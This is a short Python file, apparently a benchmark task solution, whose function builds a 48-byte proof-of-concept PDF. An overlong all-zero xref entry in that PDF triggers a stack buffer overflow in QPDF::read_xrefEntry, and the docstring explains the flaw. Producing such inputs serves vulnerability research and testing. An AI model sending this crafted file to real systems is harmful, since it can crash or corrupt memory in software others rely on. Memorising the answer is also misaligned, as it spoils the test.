class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in QPDF::read_xrefEntry.
        The vulnerability is caused by overlong f1 entries consisting only of zeros, 
        combined with missing validation for the end-of-line character.
        
        Constructs a minimal PDF file with:
        - PDF Header (%PDF-1.0\n) - 9 bytes
        - xref keyword (xref\n) - 5 bytes
        - Subsection header (0 1\n) - 4 bytes
        - Malformed entry (30 zeros) - 30 bytes
        Total length: 48 bytes
        """
        return b"%PDF-1.0\nxref\n0 1\n" + b"0" * 30